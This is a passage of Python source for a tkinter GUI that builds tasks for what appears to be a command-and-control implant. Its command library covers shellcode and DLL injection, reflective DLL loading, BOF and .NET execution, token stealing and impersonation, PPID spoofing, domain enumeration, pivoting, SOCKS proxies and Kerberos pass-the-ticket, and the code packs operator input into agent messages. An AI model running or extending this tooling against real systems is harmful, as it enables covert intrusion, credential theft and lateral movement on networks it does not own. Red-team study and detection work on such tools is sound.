import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import json
import os
import base64
import random
import string
import copy
import re

COMMAND_LIBRARY = [
    {"name": "📁 Upload File", "cmd_id": "15", "build": "upload", "auto": {"SubCommand": "upload"},
     "fields": [
         {"key": "_local", "label": "Local File Path", "type": "file", "placeholder": "/path/to/payload.bin"},
         {"key": "_remote", "label": "Remote Destination", "type": "text", "placeholder": "C:\\ProgramData\\file.bin"},
     ]},
    {"name": "📁 Download File", "cmd_id": "15", "build": "b64_arg", "auto": {"SubCommand": "download"},
     "fields": [
         {"key": "_path", "label": "Remote File to Download", "type": "text", "placeholder": "C:\\Users\\Admin\\Desktop\\secret.txt"},
     ]},
    {"name": "📁 List Directory (ls)", "cmd_id": "15", "build": "simple_arg", "auto": {"SubCommand": "dir;ui"},
     "fields": [
         {"key": "_value", "label": "Directory Path", "type": "text", "placeholder": "C:\\Users\\"},
     ]},
    {"name": "📁 Change Directory (cd)", "cmd_id": "15", "build": "simple_arg", "auto": {"SubCommand": "cd"},
     "fields": [
         {"key": "_value", "label": "Target Directory", "type": "text", "placeholder": "C:\\Users\\Public"},
     ]},
    {"name": "📁 Read File (cat)", "cmd_id": "15", "build": "b64_arg", "auto": {"SubCommand": "cat"},
     "fields": [
         {"key": "_path", "label": "File to Read", "type": "text", "placeholder": "C:\\Users\\Admin\\notes.txt"},
     ]},
    {"name": "📁 Create Directory (mkdir)", "cmd_id": "15", "build": "simple_arg", "auto": {"SubCommand": "mkdir"},
     "fields": [
         {"key": "_value", "label": "New Directory Path", "type": "text", "placeholder": "C:\\Users\\Public\\.hidden"},
     ]},
    {"name": "📁 Delete File/Dir (rm)", "cmd_id": "15", "build": "simple_arg", "auto": {"SubCommand": "remove"},
     "fields": [
         {"key": "_value", "label": "Path to Delete", "type": "text", "placeholder": "C:\\temp\\old.txt"},
     ]},
    {"name": "📁 Copy File (cp)", "cmd_id": "15", "build": "pair_paths", "auto": {"SubCommand": "cp"},
     "fields": [
         {"key": "_from", "label": "Source Path", "type": "text", "placeholder": "C:\\source\\file.txt"},
         {"key": "_to", "label": "Destination Path", "type": "text", "placeholder": "C:\\dest\\file.txt"},
     ]},
    {"name": "📁 Move / Rename (mv)", "cmd_id": "15", "build": "pair_paths", "auto": {"SubCommand": "mv"},
     "fields": [
         {"key": "_from", "label": "Source Path", "type": "text", "placeholder": "C:\\old\\file.txt"},
         {"key": "_to", "label": "New Path", "type": "text", "placeholder": "C:\\new\\file.txt"},
     ]},
    {"name": "📁 Print Working Dir (pwd)", "cmd_id": "15", "build": "no_fields", "auto": {"SubCommand": "pwd"},
     "fields": []},

    {"name": "💉 Inline-Execute BOF (.o)", "cmd_id": "20", "build": "bof", "auto": {},
     "fields": [
         {"key": "_file", "label": "BOF File (.o)", "type": "file", "placeholder": "/path/to/bof.o"},
         {"key": "FunctionName", "label": "Entry Function", "type": "text", "placeholder": "go", "default": "go"},
         {"key": "Arguments", "label": "BOF Arguments", "type": "text", "placeholder": ""},
         {"key": "Flags", "label": "Execution Mode", "type": "dropdown", "options": ["default", "threaded", "non-threaded"], "default": "default"},
         {"key": "HasCallback", "label": "Has Callback", "type": "dropdown", "options": ["false", "true"], "default": "false"},
     ]},
    {"name": "💉 DLL Inject", "cmd_id": "22", "build": "dll_inject", "auto": {},
     "fields": [
         {"key": "PID", "label": "Target Process ID", "type": "text", "placeholder": "1234 or {variable}"},
         {"key": "_file", "label": "DLL File", "type": "file", "placeholder": "/path/to/payload.dll"},
         {"key": "Arguments", "label": "DLL Arguments", "type": "text", "placeholder": "", "default": ""},
     ]},
    {"name": "💉 Shellcode Inject (into PID)", "cmd_id": "24", "build": "shellcode", "auto": {"Way": "Inject"},
     "fields": [
         {"key": "PID", "label": "Target Process ID", "type": "text", "placeholder": "1234"},
         {"key": "_file", "label": "Shellcode (.bin)", "type": "file", "placeholder": "/path/to/sc.bin"},
         {"key": "Arch", "label": "Architecture", "type": "dropdown", "options": ["x64", "x86"], "default": "x64"},
         {"key": "Technique", "label": "Technique", "type": "dropdown", "options": ["default", "createremotethread", "ntcreatethreadex", "ntqueueapcthread"], "default": "default"},
         {"key": "Argument", "label": "Argument", "type": "text", "placeholder": "", "default": ""},
     ]},
    {"name": "💉 Shellcode Spawn (new proc)", "cmd_id": "24", "build": "shellcode", "auto": {"Way": "Spawn"},
     "fields": [
         {"key": "_file", "label": "Shellcode (.bin)", "type": "file", "placeholder": "/path/to/sc.bin"},
         {"key": "Arch", "label": "Architecture", "type": "dropdown", "options": ["x64", "x86"], "default": "x64"},
         {"key": "Technique", "label": "Technique", "type": "dropdown", "options": ["default", "createremotethread", "ntcreatethreadex", "ntqueueapcthread"], "default": "default"},
         {"key": "Argument", "label": "Argument", "type": "text", "placeholder": "", "default": ""},
     ]},
    {"name": "💉 Shellcode Execute (in-proc)", "cmd_id": "24", "build": "shellcode", "auto": {"Way": "Execute"},
     "fields": [
         {"key": "_file", "label": "Shellcode (.bin)", "type": "file", "placeholder": "/path/to/sc.bin"},
         {"key": "Arch", "label": "Architecture", "type": "dropdown", "options": ["x64", "x86"], "default": "x64"},
         {"key": "Technique", "label": "Technique", "type": "dropdown", "options": ["default", "createremotethread", "ntcreatethreadex", "ntqueueapcthread"], "default": "default"},
         {"key": "Argument", "label": "Argument", "type": "text", "placeholder": "", "default": ""},
     ]},
    {"name": "💉 Spawn DLL (Reflective)", "cmd_id": "26", "build": "spawndll", "auto": {},
     "fields": [
         {"key": "_file", "label": "DLL File", "type": "file", "placeholder": "/path/to/reflective.dll"},
         {"key": "_args", "label": "DLL Arguments", "type": "text", "placeholder": "", "default": ""},
     ]},
    {"name": "💉 .NET Execute Assembly", "cmd_id": "8193", "build": "assembly", "auto": {},
     "fields": [
         {"key": "_file", "label": ".NET Assembly (.exe)", "type": "file", "placeholder": "/path/to/tool.exe"},
         {"key": "Arguments", "label": "Arguments", "type": "text", "placeholder": "--help", "default": ""},
     ]},
    {"name": "💉 .NET List CLR Versions", "cmd_id": "8195", "build": "no_fields", "auto": {},
     "fields": []},

    {"name": "⚙️ Shell Command (cmd /c)", "cmd_id": "4112", "build": "shell", "auto": {},
     "fields": [
         {"key": "_command", "label": "Command to Run", "type": "text", "placeholder": "whoami /all"},
     ]},
    {"name": "⚙️ Process List (ps)", "cmd_id": "12", "build": "direct", "auto": {},
     "fields": [
         {"key": "FromProcessManager", "label": "From Process Manager", "type": "dropdown", "options": ["false", "true"], "default": "false"},
     ]},
    {"name": "⚙️ Process Kill", "cmd_id": "4112", "build": "proc_pid", "auto": {"ProcCommand": "7"},
     "fields": [
         {"key": "_pid", "label": "Process ID to Kill", "type": "text", "placeholder": "1234"},
     ]},
    {"name": "⚙️ Process Modules", "cmd_id": "4112", "build": "proc_pid", "auto": {"ProcCommand": "2"},
     "fields": [
         {"key": "_pid", "label": "Process ID", "type": "text", "placeholder": "1234"},
     ]},
    {"name": "⚙️ Process Search (grep)", "cmd_id": "4112", "build": "proc_grep", "auto": {"ProcCommand": "3"},
     "fields": [
         {"key": "_search", "label": "Search String", "type": "text", "placeholder": "svchost"},
     ]},
    {"name": "⚙️ Process Memory Map", "cmd_id": "4112", "build": "proc_memory", "auto": {"ProcCommand": "6"},
     "fields": [
         {"key": "_pid", "label": "Process ID", "type": "text", "placeholder": "1234"},
         {"key": "_protection", "label": "Memory Protection", "type": "dropdown",
          "options": ["PAGE_EXECUTE_READWRITE", "PAGE_EXECUTE_READ", "PAGE_EXECUTE_WRITECOPY", "PAGE_EXECUTE", "PAGE_READWRITE", "PAGE_READONLY", "PAGE_WRITECOPY", "PAGE_NOACCESS", "PAGE_GUARD"],
          "default": "PAGE_EXECUTE_READWRITE"},
     ]},
    {"name": "⚙️ Block DLLs", "cmd_id": "4112", "build": "proc_blockdll", "auto": {"ProcCommand": "5"},
     "fields": [
         {"key": "_state", "label": "State", "type": "dropdown", "options": ["on", "off"], "default": "on"},
     ]},
    {"name": "⚙️ PPID Spoof", "cmd_id": "27", "build": "ppid", "auto": {},
     "fields": [
         {"key": "PPID", "label": "Parent PID to Spoof", "type": "text", "placeholder": "1234"},
     ]},

    {"name": "🔑 Token Impersonate", "cmd_id": "40", "build": "token_id", "auto": {"SubCommand": "impersonate"},
     "fields": [
         {"key": "_token_id", "label": "Token Vault ID", "type": "text", "placeholder": "0"},
     ]},
    {"name": "🔑 Token Steal", "cmd_id": "40", "build": "token_steal", "auto": {"SubCommand": "steal"},
     "fields": [
         {"key": "_pid", "label": "Process ID", "type": "text", "placeholder": "1234"},
         {"key": "_handle", "label": "Handle (hex, 0=auto)", "type": "text", "placeholder": "0", "default": "0"},
     ]},
    {"name": "🔑 Token List", "cmd_id": "40", "build": "no_fields", "auto": {"SubCommand": "list"},
     "fields": []},
    {"name": "🔑 Token Make (runas)", "cmd_id": "40", "build": "token_make", "auto": {"SubCommand": "make"},
     "fields": [
         {"key": "_domain", "label": "Domain", "type": "text", "placeholder": "WORKGROUP"},
         {"key": "_user", "label": "Username", "type": "text", "placeholder": "admin"},
         {"key": "_password", "label": "Password", "type": "text", "placeholder": "P@ssw0rd"},
         {"key": "_logon_type", "label": "Logon Type", "type": "dropdown", "options": ["2", "4", "5", "8", "9"], "default": "2"},
     ]},
    {"name": "🔑 Token Get UID", "cmd_id": "40", "build": "no_fields", "auto": {"SubCommand": "getuid"},
     "fields": []},
    {"name": "🔑 Token Revert", "cmd_id": "40", "build": "no_fields", "auto": {"SubCommand": "revert"},
     "fields": []},
    {"name": "🔑 Token Privileges List", "cmd_id": "40", "build": "no_fields", "auto": {"SubCommand": "privs-list"},
     "fields": []},
    {"name": "🔑 Token Privilege Enable", "cmd_id": "40", "build": "token_priv_get", "auto": {"SubCommand": "privs-get"},
     "fields": [
         {"key": "_priv_name", "label": "Privilege Name", "type": "text", "placeholder": "SeDebugPrivilege"},
     ]},
    {"name": "🔑 Token Remove", "cmd_id": "40", "build": "token_id", "auto": {"SubCommand": "remove"},
     "fields": [
         {"key": "_token_id", "label": "Token Vault ID", "type": "text", "placeholder": "0"},
     ]},
    {"name": "🔑 Token Clear All", "cmd_id": "40", "build": "no_fields", "auto": {"SubCommand": "clear"},
     "fields": []},
    {"name": "🔑 Token Find", "cmd_id": "40", "build": "no_fields", "auto": {"SubCommand": "find"},
     "fields": []},

    {"name": "🌐 Net Domain", "cmd_id": "2100", "build": "no_fields", "auto": {"NetCommand": "1"},
     "fields": []},
    {"name": "🌐 Net Logons", "cmd_id": "2100", "build": "net_param", "auto": {"NetCommand": "2"},
     "fields": [
         {"key": "Param", "label": "Target (hostname/IP)", "type": "text", "placeholder": "DC01"},
     ]},
    {"name": "🌐 Net Sessions", "cmd_id": "2100", "build": "net_param", "auto": {"NetCommand": "3"},
     "fields": [
         {"key": "Param", "label": "Target (hostname/IP)", "type": "text", "placeholder": "DC01"},
     ]},
    {"name": "🌐 Net Computers", "cmd_id": "2100", "build": "net_param", "auto": {"NetCommand": "4"},
     "fields": [
         {"key": "Param", "label": "Domain", "type": "text", "placeholder": "CORP.LOCAL"},
     ]},
    {"name": "🌐 Net DC List", "cmd_id": "2100", "build": "net_param", "auto": {"NetCommand": "5"},
     "fields": [
         {"key": "Param", "label": "Domain", "type": "text", "placeholder": "CORP.LOCAL"},
     ]},
    {"name": "🌐 Net Shares", "cmd_id": "2100", "build": "net_param", "auto": {"NetCommand": "6"},
     "fields": [
         {"key": "Param", "label": "Target (hostname/IP)", "type": "text", "placeholder": "DC01"},
     ]},
    {"name": "🌐 Net Local Groups", "cmd_id": "2100", "build": "net_param", "auto": {"NetCommand": "7"},
     "fields": [
         {"key": "Param", "label": "Target (hostname/IP)", "type": "text", "placeholder": "DC01"},
     ]},
    {"name": "🌐 Net Groups", "cmd_id": "2100", "build": "net_param", "auto": {"NetCommand": "8"},
     "fields": [
         {"key": "Param", "label": "Domain", "type": "text", "placeholder": "CORP.LOCAL"},
     ]},
    {"name": "🌐 Net Users", "cmd_id": "2100", "build": "net_param", "auto": {"NetCommand": "9"},
     "fields": [
         {"key": "Param", "label": "Target / Domain", "type": "text", "placeholder": "CORP.LOCAL"},
     ]},

    {"name": "🔧 Config: Verbose", "cmd_id": "2500", "build": "config_val", "auto": {"ConfigKey": "implant.verbose"},
     "fields": [
         {"key": "ConfigVal", "label": "Enable Verbose", "type": "dropdown", "options": ["true", "false"], "default": "true"},
     ]},
    {"name": "🔧 Config: Sleep Obf Address", "cmd_id": "2500", "build": "config_val", "auto": {"ConfigKey": "implant.sleep-obf.start-addr"},
     "fields": [
         {"key": "ConfigVal", "label": "Address (Lib!Func+Offset)", "type": "text", "placeholder": "ntdll.dll!RtlUserThreadStart+0x10"},
     ]},
    {"name": "🔧 Config: Sleep Technique", "cmd_id": "2500", "build": "config_val", "auto": {"ConfigKey": "implant.sleep-obf.technique"},
     "fields": [
         {"key": "ConfigVal", "label": "Technique Number", "type": "text", "placeholder": "0"},
     ]},
    {"name": "🔧 Config: BOF VEH", "cmd_id": "2500", "build": "config_val", "auto": {"ConfigKey": "implant.coffee.veh"},
     "fields": [
         {"key": "ConfigVal", "label": "Enable VEH", "type": "dropdown", "options": ["true", "false"], "default": "true"},
     ]},
    {"name": "🔧 Config: BOF Threaded", "cmd_id": "2500", "build": "config_val", "auto": {"ConfigKey": "implant.coffee.threaded"},
     "fields": [
         {"key": "ConfigVal", "label": "Enable Threaded", "type": "dropdown", "options": ["true", "false"], "default": "true"},
     ]},
    {"name": "🔧 Config: Memory Alloc", "cmd_id": "2500", "build": "config_val", "auto": {"ConfigKey": "memory.alloc"},
     "fields": [
         {"key": "ConfigVal", "label": "Alloc Method (number)", "type": "text", "placeholder": "0"},
     ]},
    {"name": "🔧 Config: Memory Execute", "cmd_id": "2500", "build": "config_val", "auto": {"ConfigKey": "memory.execute"},
     "fields": [
         {"key": "ConfigVal", "label": "Execute Method (number)", "type": "text", "placeholder": "0"},
     ]},
    {"name": "🔧 Config: Inject Technique", "cmd_id": "2500", "build": "config_val", "auto": {"ConfigKey": "inject.technique"},
     "fields": [
         {"key": "ConfigVal", "label": "Technique (number)", "type": "text", "placeholder": "0"},
     ]},
    {"name": "🔧 Config: Inject Spoof Addr", "cmd_id": "2500", "build": "config_val", "auto": {"ConfigKey": "inject.spoofaddr"},
     "fields": [
         {"key": "ConfigVal", "label": "Address (Lib!Func+Offset)", "type": "text", "placeholder": "ntdll.dll!RtlUserThreadStart+0x10"},
     ]},
    {"name": "🔧 Config: Spawn x64", "cmd_id": "2500", "build": "config_val", "auto": {"ConfigKey": "inject.spawn64"},
     "fields": [
         {"key": "ConfigVal", "label": "x64 Spawn Process", "type": "text", "placeholder": "C:\\Windows\\System32\\notepad.exe"},
     ]},
    {"name": "🔧 Config: Spawn x32", "cmd_id": "2500", "build": "config_val", "auto": {"ConfigKey": "inject.spawn32"},
     "fields": [
         {"key": "ConfigVal", "label": "x32 Spawn Process", "type": "text", "placeholder": "C:\\Windows\\SysWOW64\\notepad.exe"},
     ]},
    {"name": "🔧 Config: Kill Date", "cmd_id": "2500", "build": "config_val", "auto": {"ConfigKey": "killdate"},
     "fields": [
         {"key": "ConfigVal", "label": "Kill Date (or 0=off)", "type": "text", "placeholder": "2026-12-31 23:59:59"},
     ]},
    {"name": "🔧 Config: Working Hours", "cmd_id": "2500", "build": "config_val", "auto": {"ConfigKey": "workinghours"},
     "fields": [
         {"key": "ConfigVal", "label": "Hours (or 0=off)", "type": "text", "placeholder": "08:00-17:00"},
     ]},

    {"name": "📷 Screenshot", "cmd_id": "2510", "build": "no_fields", "auto": {},
     "fields": []},
    {"name": "💤 Sleep", "cmd_id": "11", "build": "sleep", "auto": {},
     "fields": [
         {"key": "_delay", "label": "Delay (seconds)", "type": "text", "placeholder": "5"},
         {"key": "_jitter", "label": "Jitter (%)", "type": "text", "placeholder": "50"},
     ]},
    {"name": "❌ Exit", "cmd_id": "92", "build": "exit", "auto": {},
     "fields": [
         {"key": "ExitMethod", "label": "Exit Method", "type": "dropdown", "options": ["thread", "process"], "default": "process"},
     ]},
    {"name": "✅ Checkin", "cmd_id": "100", "build": "no_fields", "auto": {},
     "fields": []},

    {"name": "📋 Job List", "cmd_id": "21", "build": "no_fields", "auto": {"Command": "list"},
     "fields": []},
    {"name": "📋 Job Suspend", "cmd_id": "21", "build": "job_param", "auto": {"Command": "suspend"},
     "fields": [
         {"key": "_job_id", "label": "Job ID", "type": "text", "placeholder": "0"},
     ]},
    {"name": "📋 Job Resume", "cmd_id": "21", "build": "job_param", "auto": {"Command": "resume"},
     "fields": [
         {"key": "_job_id", "label": "Job ID", "type": "text", "placeholder": "0"},
     ]},
    {"name": "📋 Job Kill", "cmd_id": "21", "build": "job_param", "auto": {"Command": "kill"},
     "fields": [
         {"key": "_job_id", "label": "Job ID", "type": "text", "placeholder": "0"},
     ]},

    {"name": "🔌 Pivot List", "cmd_id": "2520", "build": "no_fields", "auto": {"Command": "1"},
     "fields": []},
    {"name": "🔌 Pivot SMB Connect", "cmd_id": "2520", "build": "pivot_pipe", "auto": {"Command": "10"},
     "fields": [
         {"key": "_pipe", "label": "Pipe Path", "type": "text", "placeholder": "\\\\\\\\host\\\\pipe\\\\name"},
     ]},
    {"name": "🔌 Pivot SMB Disconnect", "cmd_id": "2520", "build": "pivot_agent", "auto": {"Command": "11"},
     "fields": [
         {"key": "_agent_id", "label": "Agent ID", "type": "text", "placeholder": "ABCDEF12"},
     ]},

    {"name": "📦 Transfer List", "cmd_id": "2530", "build": "no_fields", "auto": {"Command": "list"},
     "fields": []},
    {"name": "📦 Transfer Stop", "cmd_id": "2530", "build": "transfer_id", "auto": {"Command": "stop"},
     "fields": [
         {"key": "_file_id", "label": "File ID", "type": "text", "placeholder": "0"},
     ]},
    {"name": "📦 Transfer Resume", "cmd_id": "2530", "build": "transfer_id", "auto": {"Command": "resume"},
     "fields": [
         {"key": "_file_id", "label": "File ID", "type": "text", "placeholder": "0"},
     ]},
    {"name": "📦 Transfer Remove", "cmd_id": "2530", "build": "transfer_id", "auto": {"Command": "remove"},
     "fields": [
         {"key": "_file_id", "label": "File ID", "type": "text", "placeholder": "0"},
     ]},

    {"name": "🌍 RPortFwd Add", "cmd_id": "2540", "build": "rportfwd_add", "auto": {"Command": "rportfwd add"},
     "fields": [
         {"key": "_lcl_addr", "label": "Local Address", "type": "text", "placeholder": "0.0.0.0"},
         {"key": "_lcl_port", "label": "Local Port", "type": "text", "placeholder": "8080"},
         {"key": "_fwd_addr", "label": "Forward Address", "type": "text", "placeholder": "127.0.0.1"},
         {"key": "_fwd_port", "label": "Forward Port", "type": "text", "placeholder": "80"},
     ]},
    {"name": "🌍 RPortFwd List", "cmd_id": "2540", "build": "no_fields", "auto": {"Command": "rportfwd list"},
     "fields": []},
    {"name": "🌍 RPortFwd Remove", "cmd_id": "2540", "build": "rportfwd_remove", "auto": {"Command": "rportfwd remove"},
     "fields": [
         {"key": "_socket_id", "label": "Socket ID", "type": "text", "placeholder": "0"},
     ]},
    {"name": "🌍 RPortFwd Clear", "cmd_id": "2540", "build": "no_fields", "auto": {"Command": "rportfwd clear"},
     "fields": []},
    {"name": "🌍 SOCKS Proxy Add", "cmd_id": "2540", "build": "socks_port", "auto": {"Command": "socks add"},
     "fields": [
         {"key": "_port", "label": "SOCKS Port", "type": "text", "placeholder": "1080"},
     ]},
    {"name": "🌍 SOCKS Proxy List", "cmd_id": "2540", "build": "no_fields", "auto": {"Command": "socks list"},
     "fields": []},
    {"name": "🌍 SOCKS Proxy Kill", "cmd_id": "2540", "build": "socks_port", "auto": {"Command": "socks kill"},
     "fields": [
         {"key": "_port", "label": "SOCKS Port", "type": "text", "placeholder": "1080"},
     ]},
    {"name": "🌍 SOCKS Proxy Clear", "cmd_id": "2540", "build": "no_fields", "auto": {"Command": "socks clear"},
     "fields": []},

    {"name": "🔐 Kerberos LUID", "cmd_id": "2550", "build": "no_fields", "auto": {"Command": "luid"},
     "fields": []},
    {"name": "🔐 Kerberos KList (all)", "cmd_id": "2550", "build": "no_fields", "auto": {"Command": "klist", "Argument1": "/all"},
     "fields": []},
    {"name": "🔐 Kerberos KList (by LUID)", "cmd_id": "2550", "build": "kerberos_klist_luid", "auto": {"Command": "klist", "Argument1": "/luid"},
     "fields": [
         {"key": "_luid", "label": "LUID (hex)", "type": "text", "placeholder": "0x3e7"},
     ]},
    {"name": "🔐 Kerberos Purge", "cmd_id": "2550", "build": "kerberos_purge", "auto": {"Command": "purge"},
     "fields": [
         {"key": "_luid", "label": "LUID (hex)", "type": "text", "placeholder": "0x3e7"},
     ]},
    {"name": "🔐 Kerberos Pass-the-Ticket", "cmd_id": "2550", "build": "kerberos_ptt", "auto": {"Command": "ptt"},
     "fields": [
         {"key": "_ticket_file", "label": "Ticket File (.kirbi)", "type": "file", "placeholder": "/path/to/ticket.kirbi"},
         {"key": "_luid", "label": "LUID (hex, 0=current)", "type": "text", "placeholder": "0", "default": "0"},
     ]},
]


def build_info_dict(cmd_def, user_vals):
    info = {"CommandID": cmd_def["cmd_id"]}
    info.update(cmd_def.get("auto", {}))
    build = cmd_def.get("build", "direct")

    if build == "no_fields":
        pass
    elif build == "direct":
        for f in cmd_def["fields"]:
            if not f["key"].startswith("_"):
                info[f["key"]] = user_vals.get(f["key"], f.get("default", ""))
    elif build == "upload":
        info["Arguments"] = f"<B64FILE:{user_vals.get('_local', '')}:{user_vals.get('_remote', '')}>"
    elif build == "b64_arg":
        info["Arguments"] = f"<B64STR:{user_vals.get('_path', '')}>"
    elif build == "simple_arg":
        info["Arguments"] = user_vals.get("_value", "")
    elif build == "pair_paths":
        info["Arguments"] = f"<B64STR:{user_vals.get('_from', '')}>;<B64STR:{user_vals.get('_to', '')}>"
    elif build == "bof":
        info["FunctionName"] = user_vals.get("FunctionName", "go")
        info["Binary"] = f"<B64BIN:{user_vals.get('_file', '')}>"
        info["Arguments"] = user_vals.get("Arguments", "")
        info["HasCallback"] = user_vals.get("HasCallback", "false")
        info["Flags"] = user_vals.get("Flags", "default")
    elif build == "dll_inject":
        info["PID"] = user_vals.get("PID", "")
        info["Binary"] = f"<B64BIN:{user_vals.get('_file', '')}>"
        info["Arguments"] = user_vals.get("Arguments", "")
    elif build == "shellcode":
        info["Binary"] = f"<B64BIN:{user_vals.get('_file', '')}>"
        info["Arch"] = user_vals.get("Arch", "x64")
        info["Technique"] = user_vals.get("Technique", "default")
        info["Argument"] = user_vals.get("Argument", "")
        if cmd_def.get("auto", {}).get("Way") == "Inject":
            info["PID"] = user_vals.get("PID", "")
    elif build == "spawndll":
        info["Binary"] = f"<B64BIN:{user_vals.get('_file', '')}>"
        args = user_vals.get("_args", "")
        info["Arguments"] = f"<B64STR:{args}>" if args else ""
    elif build == "assembly":
        info["Binary"] = f"<B64BIN:{user_vals.get('_file', '')}>"
        info["Arguments"] = user_vals.get("Arguments", "")
    elif build == "shell":
        cmd = user_vals.get("_command", "")
        info["ProcCommand"] = "4"
        info["Args"] = f"0;true;true;cmd.exe;<B64STR:/c {cmd}>"
    elif build == "sleep":
        info["Arguments"] = f"{user_vals.get('_delay', '5')};{user_vals.get('_jitter', '50')}"
    elif build == "exit":
        info["ExitMethod"] = user_vals.get("ExitMethod", "process")
    elif build == "ppid":
        info["PPID"] = user_vals.get("PPID", "")
    elif build == "proc_pid":
        info["Args"] = user_vals.get("_pid", "")
    elif build == "proc_grep":
        info["Args"] = user_vals.get("_search", "")
    elif build == "proc_memory":
        info["Args"] = f"{user_vals.get('_pid', '')} {user_vals.get('_protection', 'PAGE_EXECUTE_READWRITE')}"
    elif build == "proc_blockdll":
        info["Args"] = user_vals.get("_state", "on")
    elif build == "token_id":
        info["Arguments"] = user_vals.get("_token_id", "0")
    elif build == "token_steal":
        info["Arguments"] = f"{user_vals.get('_pid', '')};{user_vals.get('_handle', '0')}"
    elif build == "token_make":
        d = user_vals.get("_domain", "")
        u = user_vals.get("_user", "")
        p = user_vals.get("_password", "")
        lt = user_vals.get("_logon_type", "2")
        info["Arguments"] = f"<B64STR:{d}>;<B64STR:{u}>;<B64STR:{p}>;{lt}"
    elif build == "token_priv_get":
        info["Arguments"] = user_vals.get("_priv_name", "")
    elif build == "net_param":
        info["Param"] = user_vals.get("Param", "")
    elif build == "config_val":
        info["ConfigVal"] = user_vals.get("ConfigVal", "")
    elif build == "job_param":
        info["Param"] = user_vals.get("_job_id", "")
    elif build == "pivot_pipe":
        info["Param"] = user_vals.get("_pipe", "")
    elif build == "pivot_agent":
        info["Param"] = user_vals.get("_agent_id", "")
    elif build == "transfer_id":
        info["FileID"] = user_vals.get("_file_id", "")
    elif build == "rportfwd_add":
        info["Params"] = f"{user_vals.get('_lcl_addr', '')};{user_vals.get('_lcl_port', '')};{user_vals.get('_fwd_addr', '')};{user_vals.get('_fwd_port', '')}"
    elif build == "rportfwd_remove":
        info["Params"] = user_vals.get("_socket_id", "")
    elif build == "socks_port":
        info["Params"] = user_vals.get("_port", "")
    elif build == "kerberos_klist_luid":
        info["Argument2"] = user_vals.get("_luid", "")
    elif build == "kerberos_purge":
        info["Argument"] = user_vals.get("_luid", "")
    elif build == "kerberos_ptt":
        info["Ticket"] = f"<B64BIN:{user_vals.get('_ticket_file', '')}>"
        info["Luid"] = user_vals.get("_luid", "0")

    return info


def find_command_index(info):
    cmd_id = info.get("CommandID", "")
    best_match = None
    best_score = -1
    for i, cmd in enumerate(COMMAND_LIBRARY):
        if cmd["cmd_id"] != cmd_id:
            continue
        auto = cmd.get("auto", {})
        score = 0
        match = True
        for k, v in auto.items():
            if str(info.get(k, "")) == str(v):
                score += 1
            else:
                match = False
                break
        if match and score > best_score:
            best_score = score
            best_match = i
    if best_match is not None:
        return best_match
    for i, cmd in enumerate(COMMAND_LIBRARY):
        if cmd["cmd_id"] == cmd_id:
            return i
    return None


def extract_user_vals(cmd_def, info):
    vals = {}
    build = cmd_def.get("build", "direct")

    if build == "upload":
        args = info.get("Arguments", "")
        m = re.search(r"<B64FILE:(.+?):(.+?)>", args)
        if m:
            vals["_local"] = m.group(1)
            vals["_remote"] = m.group(2)
    elif build == "b64_arg":
        args = info.get("Arguments", "")
        m = re.search(r"<B64STR:(.+?)>", args)
        vals["_path"] = m.group(1) if m else args
    elif build == "simple_arg":
        vals["_value"] = info.get("Arguments", "")
    elif build == "pair_paths":
        args = info.get("Arguments", "")
        parts = re.findall(r"<B64STR:(.+?)>", args)
        vals["_from"] = parts[0] if len(parts) > 0 else ""
        vals["_to"] = parts[1] if len(parts) > 1 else ""
    elif build == "bof":
        binary = info.get("Binary", "")
        m = re.search(r"<B64BIN:(.+?)>", binary)
        vals["_file"] = m.group(1) if m else binary
        vals["FunctionName"] = info.get("FunctionName", "go")
        vals["Arguments"] = info.get("Arguments", "")
        vals["Flags"] = info.get("Flags", "default")
        vals["HasCallback"] = info.get("HasCallback", "false")
    elif build == "dll_inject":
        vals["PID"] = info.get("PID", "")
        binary = info.get("Binary", "")
        m = re.search(r"<B64BIN:(.+?)>", binary)
        vals["_file"] = m.group(1) if m else binary
        vals["Arguments"] = info.get("Arguments", "")
    elif build == "shellcode":
        binary = info.get("Binary", "")
        m = re.search(r"<B64BIN:(.+?)>", binary)
        vals["_file"] = m.group(1) if m else binary
        vals["PID"] = info.get("PID", "")
        vals["Arch"] = info.get("Arch", "x64")
        vals["Technique"] = info.get("Technique", "default")
        vals["Argument"] = info.get("Argument", "")
    elif build == "spawndll":
        binary = info.get("Binary", "")
        m = re.search(r"<B64BIN:(.+?)>", binary)
        vals["_file"] = m.group(1) if m else binary
        args = info.get("Arguments", "")
        m2 = re.search(r"<B64STR:(.+?)>", args)
        vals["_args"] = m2.group(1) if m2 else args
    elif build == "assembly":
        binary = info.get("Binary", "")
        m = re.search(r"<B64BIN:(.+?)>", binary)
        vals["_file"] = m.group(1) if m else binary
        vals["Arguments"] = info.get("Arguments", "")
    elif build == "shell":
        args = info.get("Args", "")
        m = re.search(r"<B64STR:/c (.+?)>", args)
        if m:
            vals["_command"] = m.group(1)
        else:
            parts = args.split(";", 4)
            vals["_command"] = parts[4] if len(parts) > 4 else args
    elif build == "sleep":
        args = info.get("Arguments", "5;50")
        parts = args.split(";")
        vals["_delay"] = parts[0] if parts else "5"
        vals["_jitter"] = parts[1] if len(parts) > 1 else "50"
    elif build == "exit":
        vals["ExitMethod"] = info.get("ExitMethod", "process")
    elif build == "ppid":
        vals["PPID"] = info.get("PPID", "")
    elif build == "proc_pid":
        vals["_pid"] = info.get("Args", "")
    elif build == "proc_grep":
        vals["_search"] = info.get("Args", "")
    elif build == "proc_memory":
        args = info.get("Args", "")
        parts = args.split(" ", 1)
        vals["_pid"] = parts[0] if parts else ""
        vals["_protection"] = parts[1] if len(parts) > 1 else "PAGE_EXECUTE_READWRITE"
    elif build == "proc_blockdll":
        vals["_state"] = info.get("Args", "on")
    elif build == "token_id":
        vals["_token_id"] = info.get("Arguments", "0")
    elif build == "token_steal":
        args = info.get("Arguments", ";0")
        parts = args.split(";")
        vals["_pid"] = parts[0] if parts else ""
        vals["_handle"] = parts[1] if len(parts) > 1 else "0"
    elif build == "token_make":
        args = info.get("Arguments", "")
        parts = re.findall(r"<B64STR:(.+?)>", args)
        vals["_domain"] = parts[0] if len(parts) > 0 else ""
        vals["_user"] = parts[1] if len(parts) > 1 else ""
        vals["_password"] = parts[2] if len(parts) > 2 else ""
        lt_match = re.search(r";(\d+)$", args)
        vals["_logon_type"] = lt_match.group(1) if lt_match else "2"
    elif build == "token_priv_get":
        vals["_priv_name"] = info.get("Arguments", "")
    elif build == "net_param":
        vals["Param"] = info.get("Param", "")
    elif build == "config_val":
        vals["ConfigVal"] = info.get("ConfigVal", "")
    elif build == "job_param":
        vals["_job_id"] = info.get("Param", "")
